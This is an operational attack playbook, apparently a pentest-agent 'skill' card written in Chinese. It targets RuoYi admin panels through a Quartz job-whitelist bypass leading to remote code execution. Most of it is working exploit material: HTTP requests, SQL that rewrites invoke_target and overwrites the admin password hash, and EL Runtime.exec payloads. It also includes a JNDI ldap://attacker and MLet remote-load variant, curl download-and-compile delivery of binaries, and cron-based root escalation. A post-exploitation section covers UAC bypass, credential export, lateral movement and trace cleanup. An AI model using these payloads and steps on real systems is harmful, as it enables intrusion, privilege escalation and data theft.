---
name: ruoyi-quartz-whitelist-bypass-el-rce
description: "若依定时任务白名单绕过→Jakarta EL/JdbcRowSetImpl RCE：创建合法job→DB直写invoke_target→run不校验→RCE。适用RuoYi 3.x/4.x + 数据库可写场景。"
version: 1.0.0
license: MIT
platforms: [linux, windows]
---

# RuoYi Quartz 白名单绕过 → Jakarta EL RCE

Use when: RuoYi 3.x/4.x 后台 + 超管权限 + 数据库可写（MySQL root / SQLi / BFLA 写权限）

## 1. 指纹判定

- `/monitor/job` 或 `/monitor/job/list` 可达（需 RuoYi 超管 Token）
- 创建 job 时有白名单校验：
  - 正向白名单：只允许 `ryTask.*`、`ryMultipleTask.*`
  - 黑名单：`ldap:`、`ldaps:`、`rmi:`
  - 任何其他 `invoke_target` → `不允许调用` 或 `参数不允许`

## 2. 核心绕过

**漏洞本质**：`POST /monitor/job`（创建）校验白名单，`PUT /monitor/job/run`（执行）**不校验**，从 DB 重读 `invoke_target` 后直接调度。

**攻击链**：

### 步骤 1：创建合法 job
```http
POST /prod-api/monitor/job
Authorization: Bearer <admin_token>
Content-Type: application/json

{
  "jobName": "se_verify",
  "jobGroup": "DEFAULT",
  "invokeTarget": "ryTask.ryParams('se')",
  "cronExpression": "0 0 0 1 1 ? 2099",
  "misfirePolicy": "3",
  "concurrent": "1",
  "status": "1"
}
```
→ 返回 `{"msg":"操作成功","code":200}` + `jobId`

### 步骤 2：DB 直接修改 invoke_target
```sql
UPDATE sys_job SET invoke_target = 'jakarta.el.ELProcessor.eval(''Runtime.getRuntime().exec("cmd.exe /c echo SE_RCE_OK>D:/ruoyi/uploadPath/se_el1.txt")'')'
WHERE job_name = 'se_verify';
```

### 步骤 3：触发执行
```http
PUT /prod-api/monitor/job/run
Authorization: Bearer <admin_token>
Content-Type: application/json

{"jobId": <jobId>, "jobGroup": "DEFAULT"}
```

### 步骤 4：验证
```http
GET /prod-api/profile/se_el1.txt
→ 200 "SE_RCE_OK"
```

## 3. Payload 变体

### Jakarta EL（推荐，Java 11+）
```
jakarta.el.ELProcessor.eval('Runtime.getRuntime().exec("...")')
```

### javax.el.ELProcessor（Java 8）
```
javax.el.ELProcessor.eval('Runtime.getRuntime().exec("...")')
```

### JdbcRowSetImpl（JNDI，需出网）
```
com.sun.rowset.JdbcRowSetImpl.setDataSourceName('ldap://attacker/xxx')
```
注：`ldap(s)` 在创建时被黑名单拦截，但 DB 直写不受限

## 4. 前提条件

| 条件 | 必须 | 说明 |
|---|---|---|
| RuoYi 超管 Token | ✅ | 创建/执行 job 需要 |
| 数据库写权限 | ✅ | 修改 `invoke_target` 需要 |
| Java 11+（Jakarta EL） | ⚠️ | Java 8 用 `javax.el` |
| RuoYi 3.x/4.x | ✅ | `run` 路径不校验白名单 |

## 5. 超管获取路径（若只有 DB 权限）

```sql
-- 搬员工 bcrypt hash 覆盖 admin
-- 先备份原 hash
SELECT user_id, user_name, password FROM sys_user WHERE user_id = 1;

-- 用已知口令(如 123456)的 bcrypt 覆盖
UPDATE sys_user SET password = '$2a$10$7JB720yubVSZvUI0rEqK/.VqGOZTH.ulu33dHOiBE8ByOhJIrdAu2'
WHERE user_id = 1;

-- RCE 完成后还原
UPDATE sys_user SET password = '<原始hash>' WHERE user_id = 1;
```

## 6. 收尾清理

```sql
-- 删除测试 job
DELETE FROM sys_job WHERE job_name = 'se_verify';
DELETE FROM sys_job_log WHERE job_name = 'se_verify';

-- 删除写入的文件（通过 RCE）
cmd.exe /c del D:\ruoyi\uploadPath\se_*.txt
```

## 7. 工具

```bash
python3 tools/ops/ruoyi_quartz_rce.py \
  --base https://target/prod-api \
  --token <admin_token> \
  --db-host <ip>:<port> --db-user root --db-pass <pass> \
  --cmd "whoami"
```

## 8. 组合路径

```
MySQL root(弱口令/泄露) → bcrypt搬运接管admin → 创建合法job
→ DB直写invoke_target → run触发 → Jakarta EL RCE
→ 回读文件验证 → 如Windows则UAC提权→SYSTEM
```

## 9. 阴性记录

- `createTable` 只能 DDL，不能 SELECT/UPDATE（SQL 解析白名单）
- `/common/download/resource` 路径穿越 8 变体全 200 空体（不可利用）
- `/profile/**` 编码穿越一律 400
- Redis 6379 连接重置（不可达）
- JWT 密钥穷举全败（非固定密钥）

## 关联 Skill
- `ruoyi-fork-admin-pentest`：RuoYi 家族渗透总控
- `mssql-stacked-query-takeover`：若后端是 MSSQL
- `windows-lpe`：RCE 后 Windows 提权

## 姊妹路线：MUDb 文件写（10-12B 增补）

- 当 EL 解析器受限（Tomcat forceString 移除 / Java 版本墙）：改用 **JNDI → Tomcat MemoryUserDatabaseFactory（MUDb）**
- MUDb `pathname` = `http://` 前缀 + 路径穿越 → **任意文件写** → 写 `/etc/cron.d/` 得 root
- 前置：需以 root 建 `http:` 中间目录（RuoYi 代码生成器 gen_path 可用）
- 坑：cron 经 role 名换行注入时 **Tomcat 转义引号 → 命令禁含引号**
- 本路线**不依赖 EL 解析器**，与 EL/JdbcRowSetImpl 路线互补


---

## 外部库增量（2026-10-11 分享包）

## 1. 根因（一句话）

```java
// SysJobServiceImpl —— 只有创建/修改接口校验白名单
private void checkInvokeTarget(SysJob job) { ... }   // POST/PUT /monitor/job 才走

// 执行路径：ScheduleUtils.createScheduleJob
String invokeTarget = job.getInvokeTarget();          // ← 从 DB 重读
Class<?> clazz = Class.forName(...).newInstance();    // ← 直接反射，不再校验
```

**结论：`invoke_target` 只要进得了 `sys_job` 表，执行时白名单形同虚设。**

原版 `JOB_WHITELIST_STR = { "com.ruoyi", "ryTask" }`、`JOB_ERROR_STR` 里的
`java.net.URL` / `javax.naming` / `org.yaml.snakeyaml` / `ldap` 等黑名单**都在创建接口里**。

⚠️ **实测补充**：部分 fork 额外加了 `ldap(s)` 子串黑名单，且是**正向白名单**——
`javax.naming.InitialContext.lookup('ldap://127.0.0.1:1/x')`、
参数里塞 `ryTask` 做子串绕过、`java.lang.Runtime.exec('ryTask')` 全部被拒。
**不要在白名单绕过上耗时间，直接走「建合法 job → DB 改 invoke_target → run」三步。**

---

## 2. 三步链

```bash
# 1) 建合法 job（过创建校验，注册进 Quartz）
POST /monitor/job   {"jobName":"sq_x","jobGroup":"DEFAULT",
                     "invokeTarget":"ryTask.ryParams('se')",   # 合法
                     "cronExpression":"0 0 0 1 1 ? 2099","misfirePolicy":"1",
                     "concurrent":"1","status":"0"}

# 2) 直改 DB，绕过创建接口校验
UPDATE sys_job SET invoke_target='<payload>', status='0' WHERE job_id=<jid>;

# 3) 执行（不再二次校验）
PUT /monitor/job/run   {"jobId":<jid>,"jobGroup":"DEFAULT"}
```

判据：`GET /monitor/jobLog/list?pageSize=8` 里该 job 的
`status=0 且 exceptionInfo=none` = **类存在且方法被真实调用**。

---

## 3. 原语选择（按探测结果定，不要猜）

| 原语 | 适用 | 说明 |
|---|---|---|
| `jakarta.el.ELProcessor.eval('...')` | **Spring Boot 3（Jakarta）首选** | 无 JPMS 模块限制，`Runtime.getRuntime().exec` 直通 |
| `javax.el.ELProcessor.eval('...')` | Spring Boot 2 | 同上 |
| `javax.management.loading.MLet.getMBeansFromURL('http://x/y')` | 出网时 | 远程 MBean 加载 |
| `com.sun.rowset.JdbcRowSetImpl.setAutoCommit(true)` | 老版本 | **SB3/JDK17+ 常被 JPMS 拦** `IllegalAccessException` |
| `org.yaml.snakeyaml.Yaml.load('...')` | 仅老版 | 新版白名单常拦 |

探测（一次性分辨 jakarta / javax / 各候选类）：

```bash
python3 tools/ops/ruoyi_quartz_rce.py --base https://T/prod-api \
  --token-file 接管/admin_token.txt --mysql root:pw@IP:3306/db --probe
```

`ClassNotFoundException` = 类不存在；`NoSuchMethodException` = 类存在、方法名要调；
`status=0 exc=none` = **可用原语**。

---

## 4. ★ EL 转义三铁律（全是实测踩出来的）

payload 形如：

```
jakarta.el.ELProcessor.eval('Runtime.getRuntime().exec("cmd.exe /c <命令>")')
```

| 字符 | 现象 | 对策 |
|---|---|---|
| `\` | EL 字符串里是转义起始，`\"D:\ ` 里 `\ ` 非法转义 → `ELException` → `InvocationTargetException` | 命令里的 `\` 一律写成 **`\\`**（落到 cmd 才是 `\`） |
| `"` | 终结 Java 字符串字面量 | **命令里绝不出现双引号**；需要引号时改成不带引号的等价写法 |
| `,` | 被 RuoYi `getMethodParams` 的括号/逗号分割器当参数分隔符 | **命令里避免逗号**（`wmic` 系尤其小心） |

再叠加一条 **cmd 自身**的坑：

> **cmd 内建命令（`dir` / `type` / `cd` / `copy`）不接受正斜杠** —— `dir /env` 被当开关。
> 但 EL 又要求用正斜杠或双反斜杠。**所以路径一律写 `D:\\env\\frp`（EL 双写）**，
> 不要写 `D:/env` 去喂 `dir`。

踩坑样例：

```
✗ dir D:\env\frp        → EL: `\e` 非法转义 → 空输出
✗ dir D:/env/frp        → cmd: `/env` 当开关 → 报错
✓ dir D:\\env\\frp      → 正确
✗ wmic ... get X,Y      → 逗号被 RuoYi 参数分割器吃掉
```

---

## 5. `invoke_target` 列长 = varchar(500) 是硬约束

RuoYi 默认 `` `invoke_target` varchar(500) ``。**payload 必须 ≤ ~490 字符**，于是：

* ❌ **不能**用 `powershell -EncodedCommand <b64>`（b64 轻松 4KB+，撑爆列长）
* ❌ **不能**用 MySQL `general_log` 落 `.ps1`（首行会带日志前缀，`.ps1` 不容忍垃圾行）
* ✅ 只能拼**短**命令：`cmd.exe /c <短命令> > <uploadPath>/<out> 2>&1`

### 5.1 短命令通道（复用同一个 job，快 5-8 倍）

`tools/ops/ruoyi_quartz_rce.py` 的 `channel()` / `tools/ops/qxxt_125_sh.py`：
只建 **一个** job，之后每条命令只 `UPDATE invoke_target` + `run` + HTTP 读回，
单条 ≈ 1.5-2s。

### 5.2 ★ 绕开列长的正解：目标站自己的对象存储当 HTTP 投递源

RuoYi 的 `/common/upload` 落到 MinIO/OSS，而
`/common/oss/{bucket}/{objectKey}`（**同名 `fileUrl` 裸域）通常匿名可读**。
于是长东西不用进 `invoke_target`，走「**先投递、再短命令执行**」：

```
本机 → POST /common/upload（拿匿名 URL）
目标机 → curl.exe -s -k -o D:\ruoyi\uploadPath\x.cs <匿名URL>
目标机 → C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:...\x.exe ...\x.cs
目标机 → ...\x.exe
```

三条命令每条都只有一两百字符，**全部塞得进 500 字列**。
这一步把「只能在目标机上敲短命令」升级成「**可以投递任意二进制**」——
后续提权 / 免杀 / 横向要用的 exe、ps1、bat 都能这么送进去。

前置校验（必须做，否则白忙）：

```python
# 1) 上传 2) 不带 Authorization 再 GET 一次，确认匿名可读
rr = requests.get(upload_json["fileUrl"], timeout=25, verify=False)   # 期望 200
```

### 5.3 仍然要用 `general_log` 时：`.bat` 是唯一可靠载体

`secure_file_priv=NULL` 时 `INTO OUTFILE/DUMPFILE` 全废，但 general_log 仍是任意路径写。
三个实测约束：

1. **先 `echo.> 目标文件` 预建非空文件** —— MySQL 只对新建/空文件写 3 行表头，
   表头第三行 `Time  Id Command  Argument` 会被 cmd 当 **`TIME` 内部命令**，
   卡在 `Enter the new time:` 等输入，bat 永远跑不到正文。
2. general_log 记的是**客户端发来的原始 SQL 文本**，不做反转义 → pymysql 转义出的
   `\'` / `\\` 会原样落盘 ⇒ **内容里不能有 `'` 和 `\`**。base64 恰好两个都不含。
3. 首行必然被加 `<时间戳>\t<Id> <Cmd>\t` 前缀 → **载体必须容忍垃圾首行**：`.bat` 可以
   （前面垫一行 `rem x`），`.ps1` / `.cs` 不行。

⇒ 老写法：`.bat` 里 `set P=` 攒 base64 → `powershell -EncodedCommand %P%`。
⚠️ **但这个写法有 8191 字符单行上限**：`set P=%P%<3000>` 累积 3 段就爆，
症状是**静默无输出**。b64 超过 ~6KB 就别用，改走 5.2 的 HTTP 投递。

---

## 6. 通用化工具

```bash
# 探测原语
python3 tools/ops/ruoyi_quartz_rce.py --base https://T/prod-api \
  --token-file 接管/admin_token.txt --mysql root:pw@IP:3306/db --probe

# 单发命令（自带 stdout 落盘 + /profile/ 读回）
python3 tools/ops/ruoyi_quartz_rce.py --base https://T/prod-api \
  --token-file 接管/admin_token.txt --mysql root:pw@IP:3306/db \
  --upload-path D:/ruoyi/uploadPath --profile /profile "whoami"

# 常驻通道（复用同一 job，多命令）
python3 tools/ops/qxxt_125_sh.py "whoami" "hostname" "ipconfig"
python3 tools/ops/qxxt_125_sh.py --raw "echo aGVsbG8=> D:\\x.txt"
python3 tools/ops/qxxt_125_sh.py --close          # 收尾清理
```

配套：`tools/ops/ps_recon1.ps1`（主机侦察）、`tools/ops/ps_uac_bypass.ps1`（UAC 多法探测）。

---

## 7. 拿到命令通道之后（别停）

1. **认环境**：`whoami` / `hostname` / `ver` / `whoami /priv` / `whoami /groups`
   - `whoami /priv` 只有 **6 个基础特权** 且 `Administrators` 是 `Group used for deny only`
     ⇒ 这是 **UAC 过滤后的 Medium IL 令牌**，不是"提权令牌"，下一步是 UAC bypass。
2. **找隧道/部署拓扑**：`dir /s /b D:\*frp*`、`frpc.toml`、`read_config.bat`
   —— 内网穿透的 `frpc.toml` 一读，**真正的后端主机名 + frps 地址 + 端口映射**全暴露。
3. **落库前置数据**：`sys_user` / `sys_config` / `sys_job_log` 全量导出，供凭据复用。
4. **提权**：UAC bypass → High IL；再 `schtasks /create /ru SYSTEM` 或 token 窃取 → SYSTEM。
5. **横向**：frp 拓扑 + `ipconfig` 给的网段（VMnet / WLAN）→ `internal_scan.py`。
6. **收尾**：删本工具建的所有 job（`--close`）、删上传的 marker / exe、**恢复
   `SET GLOBAL general_log='OFF'` 与 original `general_log_file`**。

---

## 8. 反向判据（什么时候这条链不成立）

* `sys_job` 表不可写（无 DB root、无注入、无备份恢复）→ 本卡无效，回去打库。
* 目标不是 RuoYi 系（`/monitor/job` 不存在或 401/404）→ 换卡。
* `invoke_target` 列被改成极短（如 varchar(100)）→ 短命令也得砍到极限，考虑
  只落一个 `.bat` 再让 job 去 `cmd /c D:\\x.bat`。
* 执行路径也二次校验白名单（少部分加固 fork）→ 用 `run()` 前先 `--probe` 验证，
  若探针全 `status=1` + 白名单异常则本链封死，回 `ruoyi-fork-admin-pentest` 找别面。
